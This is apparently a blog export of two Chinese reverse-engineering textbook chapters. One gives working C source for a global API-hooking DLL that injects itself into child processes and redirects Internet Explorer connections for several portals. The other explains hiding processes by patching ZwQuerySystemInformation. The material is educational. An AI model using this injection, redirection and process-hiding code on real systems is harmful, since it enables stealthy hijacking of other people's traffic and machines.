class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL WINAPI <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span><br>&#123;<br>    <span class="hljs-type">char</span>            szCurProc[MAX_PATH] = &#123;<span class="hljs-number">0</span>,&#125;;<br>    <span class="hljs-type">char</span>            *p = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">switch</span>( fdwReason )<br>    &#123;<br>        <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH : <br>            DebugLog(<span class="hljs-string">&quot;DllMain() : DLL_PROCESS_ATTACH\n&quot;</span>);<br><br>            GetModuleFileNameA(<span class="hljs-literal">NULL</span>, szCurProc, MAX_PATH);<br>            p = <span class="hljs-built_in">strrchr</span>(szCurProc, <span class="hljs-string">&#x27;\\&#x27;</span>);<br>            <span class="hljs-keyword">if</span>( (p != <span class="hljs-literal">NULL</span>) &amp;&amp; !_stricmp(p+<span class="hljs-number">1</span>, <span class="hljs-string">&quot;iexplore.exe&quot;</span>) )<br>            &#123;<br>                DebugLog(<span class="hljs-string">&quot;DllMain() : current process is [iexplore.exe]\n&quot;</span>);<br><br>                <span class="hljs-comment">// 钩取 wininet!InternetConnectW() API 之前预先加载 wininet.dll</span><br>                <span class="hljs-keyword">if</span>( <span class="hljs-literal">NULL</span> == LoadLibrary(<span class="hljs-string">L&quot;wininet.dll&quot;</span>) )<br>                &#123;<br>                    DebugLog(<span class="hljs-string">&quot;DllMain() : LoadLibrary() failed!!! [%d]\n&quot;</span>,<br>                             GetLastError());<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// hook</span><br>            hook_by_code(<span class="hljs-string">&quot;ntdll.dll&quot;</span>, <span class="hljs-string">&quot;ZwResumeThread&quot;</span>, <br>                         (PROC)NewZwResumeThread, g_pZWRT);<br>            hook_by_code(<span class="hljs-string">&quot;wininet.dll&quot;</span>, <span class="hljs-string">&quot;InternetConnectW&quot;</span>, <br>                         (PROC)NewInternetConnectW, g_pICW);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH :<br>            DebugLog(<span class="hljs-string">&quot;DllMain() : DLL_PROCESS_DETACH\n&quot;</span>);<br><br>            <span class="hljs-comment">// unhook</span><br>            unhook_by_code(<span class="hljs-string">&quot;ntdll.dll&quot;</span>, <span class="hljs-string">&quot;ZwResumeThread&quot;</span>, <br>                           g_pZWRT);<br>            unhook_by_code(<span class="hljs-string">&quot;wininet.dll&quot;</span>, <span class="hljs-string">&quot;InternetConnectW&quot;</span>, <br>                           g_pICW);<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>DllMain()函数的核心功能是ntdll!ZwResumeThread()与wininet!InternetConnectW() API的“挂钩&#x2F;脱钩”功能。其中有条语句显得比较特别，若运行的进程名为iexplorer.exe时，则加载wininet.dll文件。iexplorer.exe进程正常运行时，自然会加载wininet.dll，为什么还要特意增加一条语句加载它呢？这与全局API钩取的特性有关。钩取ntdll!ZwResumeThread()API时，需要在相关进程的主线程开始之前拦截控制权，此时，我们要钩取的wininetdll模块可能尚未加载。若模块未加载就钩取其内部API，将导致失败。为防止出现这类问题，进程为iexplore.exe时，钩取wininet! InternetConnectW() AJPI之前必须加载wininet.dll文件。</p><blockquote><p>示例代码中，我们使用5字节修改技术钩取Wininet.InternetConnectW() API,当然使用7字节修改技术也是可以的。但是钩取ntdll.ZwResumeThread()API只能使用5字节修改技术（由于没有足够的空间，所以无法使用7字节修改技术）。关于7字节修改技术（“热补丁”）请参考第33章。</p></blockquote><h2 id="34-6-2-NewlnternetConnectW"><a href="#34-6-2-NewlnternetConnectW" class="headerlink" title="34.6.2 NewlnternetConnectW()"></a>34.6.2 NewlnternetConnectW()</h2><p>wininet!InternetConnectW()的钩取函数为NewInternetConnectW()函数，它负责监视IE的连接地址，IE尝试连接到特定网站时，将其转到我们指定的网站。以下是NewInternetConnectW()函数的代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c">HINTERNET WINAPI <span class="hljs-title function_">NewInternetConnectW</span><br><span class="hljs-params">(</span><br><span class="hljs-params">    HINTERNET hInternet,</span><br><span class="hljs-params">    LPCWSTR lpszServerName,</span><br><span class="hljs-params">    INTERNET_PORT nServerPort,</span><br><span class="hljs-params">    LPCTSTR lpszUsername,</span><br><span class="hljs-params">    LPCTSTR lpszPassword,</span><br><span class="hljs-params">    DWORD dwService,</span><br><span class="hljs-params">    DWORD dwFlags,</span><br><span class="hljs-params">    DWORD_PTR dwContext</span><br><span class="hljs-params">)</span><br>&#123;<br>    HINTERNET hInt = <span class="hljs-literal">NULL</span>;<br>    FARPROC pFunc = <span class="hljs-literal">NULL</span>;<br>    HMODULE hMod = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">// unhook</span><br>    <span class="hljs-keyword">if</span>( !unhook_by_code(<span class="hljs-string">&quot;wininet.dll&quot;</span>, <span class="hljs-string">&quot;InternetConnectW&quot;</span>, g_pICW) )<br>    &#123;<br>        DebugLog(<span class="hljs-string">&quot;NewInternetConnectW() : unhook_by_code() failed!!!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// call original API</span><br>    hMod = GetModuleHandle(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span>( hMod == <span class="hljs-literal">NULL</span> )<br>    &#123;<br>        DebugLog(<span class="hljs-string">&quot;NewInternetConnectW() : GetModuleHandle() failed!!! [%d]\n&quot;</span>,<br>                  GetLastError());<br>        <span class="hljs-keyword">goto</span> __INTERNETCONNECT_EXIT;<br>    &#125;<br><br>    pFunc = GetProcAddress(hMod, <span class="hljs-string">&quot;InternetConnectW&quot;</span>);<br>    <span class="hljs-keyword">if</span>( pFunc == <span class="hljs-literal">NULL</span> )<br>    &#123;<br>        DebugLog(<span class="hljs-string">&quot;NewInternetConnectW() : GetProcAddress() failed!!! [%d]\n&quot;</span>,<br>                  GetLastError());<br>        <span class="hljs-keyword">goto</span> __INTERNETCONNECT_EXIT;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>( !_tcsicmp(lpszServerName, <span class="hljs-string">L&quot;www.naver.com&quot;</span>) ||<br>        !_tcsicmp(lpszServerName, <span class="hljs-string">L&quot;www.daum.net&quot;</span>) ||<br>        !_tcsicmp(lpszServerName, <span class="hljs-string">L&quot;www.nate.com&quot;</span>) || <br>        !_tcsicmp(lpszServerName, <span class="hljs-string">L&quot;www.yahoo.com&quot;</span>) )<br>    &#123;<br>        DebugLog(<span class="hljs-string">&quot;[redirect] naver, daum, nate, yahoo =&gt; reversecore\n&quot;</span>);<br>        hInt = ((PFINTERNETCONNECTW)pFunc)(hInternet,<br>                                           <span class="hljs-string">L&quot;www.reversecore.com&quot;</span>,<br>                                           nServerPort,<br>                                           lpszUsername,<br>                                           lpszPassword,<br>                                           dwService,<br>                                           dwFlags,<br>                                           dwContext);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        DebugLog(<span class="hljs-string">&quot;[no redirect]\n&quot;</span>);<br>        hInt = ((PFINTERNETCONNECTW)pFunc)(hInternet,<br>                                           lpszServerName,<br>                                           nServerPort,<br>                                           lpszUsername,<br>                                           lpszPassword,<br>                                           dwService,<br>                                           dwFlags,<br>                                           dwContext);<br>    &#125;<br><br>__INTERNETCONNECT_EXIT:<br><br>    <span class="hljs-comment">// hook</span><br>    <span class="hljs-keyword">if</span>( !hook_by_code(<span class="hljs-string">&quot;wininet.dll&quot;</span>, <span class="hljs-string">&quot;InternetConnectW&quot;</span>, <br>                      (PROC)NewInternetConnectW, g_pICW) )<br>    &#123;<br>        DebugLog(<span class="hljs-string">&quot;NewInternetConnectW() : hook_by_code() failed!!!\n&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> hInt;<br>&#125;<br></code></pre></td></tr></table></figure><p>从以上代码可以看到，NewInternetConnectW()函数代码并不复杂。函数的第二个参数IpszServerName字符串即是要连接的网站地址。监视该连接地址，IE连接的是特定网站（Naver、Daum、Nate、Yahoo）时，就将连接地址修改为我的博客地址（ReverseCore ）。</p><h2 id="34-6-3-NewZwResumeThread"><a href="#34-6-3-NewZwResumeThread" class="headerlink" title="34.6.3 NewZwResumeThread()"></a>34.6.3 NewZwResumeThread()</h2><p>NewZwResumeThread()函数用来对ntdll!ZwResumeThread() API进行全局钩取，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c">NTSTATUS WINAPI <span class="hljs-title function_">NewZwResumeThread</span><span class="hljs-params">(HANDLE ThreadHandle, PULONG SuspendCount)</span><br>&#123;<br>    NTSTATUS status, statusThread;<br>    FARPROC pFunc = <span class="hljs-literal">NULL</span>, pFuncThread = <span class="hljs-literal">NULL</span>;<br>    DWORD dwPID = <span class="hljs-number">0</span>;<br><span class="hljs-type">static</span> DWORD dwPrevPID = <span class="hljs-number">0</span>;<br>    THREAD_BASIC_INFORMATION tbi;<br>    HMODULE hMod = <span class="hljs-literal">NULL</span>;<br>    TCHAR szModPath[MAX_PATH] = &#123;<span class="hljs-number">0</span>,&#125;;<br><br>    DebugLog(<span class="hljs-string">&quot;NewZwResumeThread() : start!!!\n&quot;</span>);<br><br>    hMod = GetModuleHandle(<span class="hljs-string">L&quot;ntdll.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span>( hMod == <span class="hljs-literal">NULL</span> )<br>    &#123;<br>        DebugLog(<span class="hljs-string">&quot;NewZwResumeThread() : GetModuleHandle() failed!!! [%d]\n&quot;</span>,<br>                  GetLastError());<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// call ntdll!ZwQueryInformationThread()</span><br>    pFuncThread = GetProcAddress(hMod, <span class="hljs-string">&quot;ZwQueryInformationThread&quot;</span>);<br>    <span class="hljs-keyword">if</span>( pFuncThread == <span class="hljs-literal">NULL</span> )<br>    &#123;<br>        DebugLog(<span class="hljs-string">&quot;NewZwResumeThread() : GetProcAddress() failed!!! [%d]\n&quot;</span>,<br>                  GetLastError());<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    statusThread = ((PFZWQUERYINFORMATIONTHREAD)pFuncThread)<br>                   (ThreadHandle, <span class="hljs-number">0</span>, &amp;tbi, <span class="hljs-keyword">sizeof</span>(tbi), <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span>( statusThread != STATUS_SUCCESS )<br>    &#123;<br>        DebugLog(<span class="hljs-string">&quot;NewZwResumeThread() : pFuncThread() failed!!! [%d]\n&quot;</span>, <br>                 GetLastError());<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    dwPID = (DWORD)tbi.ClientId.UniqueProcess;<br>    <span class="hljs-keyword">if</span> ( (dwPID != GetCurrentProcessId()) &amp;&amp; (dwPID != dwPrevPID) )<br>    &#123;<br>        DebugLog(<span class="hljs-string">&quot;NewZwResumeThread() =&gt; call InjectDll()\n&quot;</span>);<br><br>        dwPrevPID = dwPID;<br><br>        <span class="hljs-comment">// change privilege</span><br>       <span class="hljs-keyword">if</span>( !SetPrivilege(SE_DEBUG_NAME, TRUE) )<br>            DebugLog(<span class="hljs-string">&quot;NewZwResumeThread() : SetPrivilege() failed!!!\n&quot;</span>);<br><br>        <span class="hljs-comment">// get injection dll path</span><br>        GetModuleFileName(GetModuleHandle(STR_MODULE_NAME), <br>                          szModPath, <br>                          MAX_PATH);<br><br>        <span class="hljs-keyword">if</span>( !InjectDll(dwPID, szModPath) )<br>            DebugLog(<span class="hljs-string">&quot;NewZwResumeThread() : InjectDll(%d) failed!!!\n&quot;</span>, dwPID);<br>    &#125;<br><br>    <span class="hljs-comment">// call ntdll!ZwResumeThread()</span><br>    <span class="hljs-keyword">if</span>( !unhook_by_code(<span class="hljs-string">&quot;ntdll.dll&quot;</span>, <span class="hljs-string">&quot;ZwResumeThread&quot;</span>, g_pZWRT) )<br>    &#123;<br>        DebugLog(<span class="hljs-string">&quot;NewZwResumeThread() : unhook_by_code() failed!!!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    pFunc = GetProcAddress(hMod, <span class="hljs-string">&quot;ZwResumeThread&quot;</span>);<br>    <span class="hljs-keyword">if</span>( pFunc == <span class="hljs-literal">NULL</span> )<br>    &#123;<br>        DebugLog(<span class="hljs-string">&quot;NewZwResumeThread() : GetProcAddress() failed!!! [%d]\n&quot;</span>,<br>                  GetLastError());<br>        <span class="hljs-keyword">goto</span> __NTRESUMETHREAD_END;<br>    &#125;<br><br>    status = ((PFZWRESUMETHREAD)pFunc)(ThreadHandle, SuspendCount);<br>    <span class="hljs-keyword">if</span>( status != STATUS_SUCCESS )<br>    &#123;<br>        DebugLog(<span class="hljs-string">&quot;NewZwResumeThread() : pFunc() failed!!! [%d]\n&quot;</span>, GetLastError());<br>        <span class="hljs-keyword">goto</span> __NTRESUMETHREAD_END;<br>    &#125;<br><br>__NTRESUMETHREAD_END:<br><br>    <span class="hljs-keyword">if</span>( !hook_by_code(<span class="hljs-string">&quot;ntdll.dll&quot;</span>, <span class="hljs-string">&quot;ZwResumeThread&quot;</span>, <br>                      (PROC)NewZwResumeThread, g_pZWRT) )<br>    &#123;<br>        DebugLog(<span class="hljs-string">&quot;NewZwResumeThread() : hook_by_code() failed!!!\n&quot;</span>);<br>    &#125;<br><br>    DebugLog(<span class="hljs-string">&quot;NewZwResumeThread() : end!!!\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> status;<br>&#125;<br></code></pre></td></tr></table></figure><p>NewZwResumeThread()函数的第一个参数是要恢复运行的线程句柄（ThreadHandle）。前面说明中已经指出，该线程即是子进程的主线程。在NewZwResumeThread()函数的前半部分调用ZwQueryInformationThread() API,就是为了获取线程句柄所指线程（子进程的线程）所属的子进程的PID。像这样，通过线程句柄参数即可获得（刚刚创建的）子进程的PID，然后使用该PID就可以注入redirect.dll （钩取DLL）文件。相关子进程在主线程运行前就已经注入redirect.dll文件，自动实现了API钩取。最后正常调用ntdll!ZwResumeThread()API，将子进程的主线程恢复运行。这样，子进程就在API被钩取的状态下得以正常运行。</p><blockquote><p>钩取 ntdll!ZwResumeThread() API 比构取 kernel32!CreateProcess() API 更强大、更方便。因为CreateProcess()在内部调用了 CreateProcessInteraal()0如果在程序中直接调用CreateProcessInternel(),则无法正常钩取（此时直接钩取CreateProcessInternel()反而更好）。像这样，越钩取低级API （ntdll.dll中提供的API）,效果越好。但是大部分低级API尚未文档化，根据OS版本不同可能变化。相反，高级API （kernel32.dll级 别-公开的）一般不会变化，文档化做得也非常好，用来钩取是比较稳定的，但是钩取性能要差一些。所以，高级API钩取与低级API钩取各有长短，使用时要根据具体情况选择，这才是明智的做法。</p></blockquote><h1 id="34-7小结"><a href="#34-7小结" class="headerlink" title="34.7小结"></a>34.7小结</h1><p>本章分析了练习示例的源代码，进一步学习了全局API钩取的实现原理，并借此掌握了有关API钩取的所有知识。若想成为API钩取专家就要不断尝试，经历大量失败来积累丰富的实战经验。接触并解决各类问题才能逐渐提高代码逆向分析水平，相信大家会对此深有体会。</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第33章 隐藏进程</title>
    <link href="/1999/03/03/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/"/>
    <url>/1999/03/03/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>第33章隐藏进程<br>本章将讲解通过修改API代码（CodePatch）实现API钩取的技术，还要讲一下有关全局钩取（Global hooking）的内容，它能钩取所有进程。此外，还讲解使用上述方法隐藏（Stealth）特定进程的技术，并通过练习示例帮助大家理解掌握。</p><blockquote><p>隐藏进程（stealth process）在代码逆向分析领域中的专业术语为Rootkit,它是指 通过修改（hooking）系统内核来隐藏进程、文件、注册表等的一种技术。Rootkit的相关内容不在本章讲解范围内，为便于理解，本书中将统一使用“隐藏进程”这一名称。</p></blockquote><h1 id="33-1-技术图表"><a href="#33-1-技术图表" class="headerlink" title="33.1 技术图表"></a>33.1 技术图表</h1><p>正式学习前，先看一下图33-1的技术图表。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220227173635529.png" alt="图33-1 技术图表"></p><p>技术图表标有下划线的部分表示的就是API代码修改技术。库文件被加载到进程内存后，在其目录映像中直接修改要钩取的API代码本身，这就是所谓的API代码修改技术。该技术广泛应用于API钩取，因为可以用它钩取大部分API,使用起来非常灵活。</p><p>前面我们讲过IAT钩取技术，如果要钩取的API不在进程的IAT中，那么就无法使用该技术。反之，“API代码修改”技术没有这一限制。</p><p>另外，为了灵活使用目标进程的内存空间，我使用了DLL注入技术。</p><h1 id="33-2-API代码修改技术的原理"><a href="#33-2-API代码修改技术的原理" class="headerlink" title="33.2 API代码修改技术的原理"></a>33.2 API代码修改技术的原理</h1><p>本节将具体讲解使用API代码修改技术钩取API的工作原理。与前一章学过的IAT钩取技术相比，API代码修改技术更易理解。IAT钩取通过操作进程的特定IAT值来实现API钩取，而API代码修改技术则将API代码的前5个字节修改为JMP XXXXXXXX指令来钩取API。调用执行被钩取的API时，（修改后的）JMP XXXXXXXX指令就会被执行，转而控制hooking函数。后面图33-3描述的是，向 Process Explorer 进程（procexp.exe）注入 stealth.dll 文件后钩取 ntdll.ZwQuerySystemInformation() API的整个过程（ntdll.ZwQuerySystemInformation() API是为了隐藏进程而需要钩取的API）。</p><h2 id="33-2-1-钩取之前"><a href="#33-2-1-钩取之前" class="headerlink" title="33.2.1 钩取之前"></a>33.2.1 钩取之前</h2><p>首先看一下钩取之前正常调用API的进程内存。图33-2描述的是（钩取之前）正常调用API的情形。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220227173930301.png" alt="图33-2 钩取之前正常调用API"></p><p>procexp.exe代码调用ntdll.ZwQuerySystemInformation() API时，程序执行流顺序如下。 </p><p>① procexp.exe 的00422CF7地址处的 CALL DWORD PTR DS:[48C69C]指令调用ntdll.ZwQuerySystemlnformation() API （48C69C地址在进程的IAT区域中，其值为7C93D92E，它是ntdll.ZwQuerySystemInformation() API的起始地址）。 </p><p>②相应API执行完毕后，返回到调用代码的下一条指令的地址处。</p><h2 id="33-2-2-钩取之后"><a href="#33-2-2-钩取之后" class="headerlink" title="33.2.2 钩取之后"></a>33.2.2 钩取之后</h2><p>下面看看钩取指定API后程序执行的过程。先把stealth.dir注入目标进程（procexp.exe）,直接修改ntdll.ZwQuerySystemInformation() API的代码（Code Patch）,如图33-3所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220227174100750.png" alt="图33-3 钩取之后调用执行API的流程"></p><p>图33-3看上去相当复杂，下面逐一分析说明。</p><p>首先把stealth.dll注入目标进程，钩取ntdll.ZwQuerySystemInformation() API。ntdll.ZwQuerySystemInformation()API起始地址（7C93D92E）的5个字节代码被修改为JMP 10001120 （仅修改5个字节代码）。10001120是stealth.MyZwQuerySystemInformation()函数的地址。此时，在procexp.exe<br>代码中调用ntdll.ZwQuerySystemInformation()API,程序将按如下顺序执行。 </p><p>①在422CF7地址处调用ntdll.ZwQuerySystemlnformation() API （7C93D92E）。 </p><p>②位于7C93D92E地址处的（修改后的）JMP 10001120指令将执行流转到10001120地址处（hooking函数）。1000116A地址处的CALL unhook()指令用来将ntdll.ZwQuerySystemInformation() API的起始5个字节恢复原值。 </p><p>③位于1000119B地址处的CALL EAX（7C93D92E）指令将调用原来的函数（ntdll.ZwQuerySystemInformation() API）（由于前面已经“脱钩”，所以可以正常调用执行）。 </p><p>④ ntdll.ZwQuerySystemInformation()执行完毕后，由7C93D93A地址处的RETN 10指令返回到stealth.dll代码区域（调用自身的位置）。然后10001212地址处的CALL hook()指令再次钩取ntdll.ZwQuerySystemlnformation() API （即将开始的5字节修改为JMP 10001120指令）。 </p><p>⑤ stealth.MyZwQuerySystemInformation()函数执行完毕后，由 10001233地址处的RETN 10命 令返回到procexp.exe进程的代码区域，继续执行。</p><p>上述过程刚开始看似很难，多看几遍，慢慢就会明白的。</p><p>使用API代码修改技术的好处是可以钩取进程中使用的任意API。前面讲过的IAT钩取技术仅适用于可钩取的API,而API代码修改技术无此限制，（虽然代码会更复杂一些）使用起来要自由得多。使用API代码修改技术的唯一限制是，要钩取的API代码长度要大于5个字节，但是由于所有API代码长度都大于5个字节，所以事实上这个限制是不存在的。</p><blockquote><p>顾名思义，API代码修改就是指直接修改映射到目标进程内存空间的系统DLL的代码。进程的其他线程正在读（read）某个函数时，尝试修改其代码会怎么样呢？这样做会引发非法访问（Access Violation）异常（后面会讲解该问题的解决方法）。</p></blockquote><p>接下来继续讲解进程隐藏的工作原理。</p><h1 id="33-3-进程隐藏"><a href="#33-3-进程隐藏" class="headerlink" title="33.3 进程隐藏"></a>33.3 进程隐藏</h1><p>进程隐藏的相关内容信息已经得到大量公开，其中用户模式下最常用的是ntdll.ZwQuerySystemInformation() API钩取技术，下面对其进行讲解。</p><h2 id="33-3-1-进程隐藏工作原理"><a href="#33-3-1-进程隐藏工作原理" class="headerlink" title="33.3.1 进程隐藏工作原理"></a>33.3.1 进程隐藏工作原理</h2><p>隐形战机是为了防止雷达探测追踪而运用各种先进科学技术研制的全新战机（与现有战斗机完全不同）。隐形战斗机的隐形对象就是其本身。®而隐形进程的概念与此恰好相反。为了隐藏某个特定进程，要潜入其他所有进程内存，钩取相关API。也就是说，实现进程隐藏的关键不是进程自身，而是其他进程。仍以战斗机为例子，实现进程隐藏的工作原理大致如下：</p><p>普通战斗机起飞升空后，通过某种方法使追踪雷达发生故障（人为操作、破坏）， 这样雷达就无法正常工作，普通战斗机就变为隐形战机。</p><p>虽然例子举得有些牵强，但描述的工作原理与隐藏进程是完全一样的。</p><h2 id="33-3-2-相关-API"><a href="#33-3-2-相关-API" class="headerlink" title="33.3.2 相关 API"></a>33.3.2 相关 API</h2><p>由于进程是内核对象，所以（用户模式下的程序）只要通过相关API就能检测到它们。用户模式下检测进程的相关API通常分为如下2类（出处：MSDN）。</p><ol><li>CreateToolhelp32Snapshot() &amp; EnumProcess()</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">HANDLE WINAPI <span class="hljs-title function_">CreateToolhelp32Snapshot</span><span class="hljs-params">(</span><br><span class="hljs-params">    DWORD dwFlags,</span><br><span class="hljs-params">    DWORD th32ProcessID</span><br><span class="hljs-params">)</span>;<br>BOOL <span class="hljs-title function_">EnumProcesses</span><span class="hljs-params">(</span><br><span class="hljs-params">    DWORD* pProcessIds,</span><br><span class="hljs-params">    DWORD cb,</span><br><span class="hljs-params">    DWORD* pBytesReturned</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>上面2个API均在其内部调用了ntdll.ZwQuerySystemInformation() API。 </p><ol start="2"><li>ZwQuerySystemlnformation()</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">NTSTATUS WINAPI <span class="hljs-title function_">ZwQuerySystemInformation</span><span class="hljs-params">(</span><br><span class="hljs-params">  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span><br><span class="hljs-params">  _Inout_   PVOID                    SystemInformation,</span><br><span class="hljs-params">  _In_      ULONG                    SystemInformationLength,</span><br><span class="hljs-params">  _Out_opt_ PULONG                   ReturnLength</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>借助ZwQuerySystemInformation() API可以获取运行中的所有进程信息（结构体），形成一个链表（Linkedlist）。操作该链表（从链表中删除）即可隐藏相关进程。所以在用户模式下不需要分别钩取CreateToolhelp32Snapshot()与EnumProcess()，只需钩取ZwQuerySystemInformation() API就可隐藏指定进程。请大家注意，我们要钩取的目标进程不是要隐藏的进程，而是其他进程（操作的不是“飞机”，而是“雷达”）。</p><h2 id="33-3-3-隐藏技术的问题"><a href="#33-3-3-隐藏技术的问题" class="headerlink" title="33.3.3 隐藏技术的问题"></a>33.3.3 隐藏技术的问题</h2><p>假如我们要隐藏的进程为test.exe，如果钩取运行中的ProcExp.exe （或者taskmgr.exe）进程的ZwQuerySystemInfoimation()API,那么ProcExp.exe就无法查找到test.exe。</p><blockquote><p>ProcExp.exe 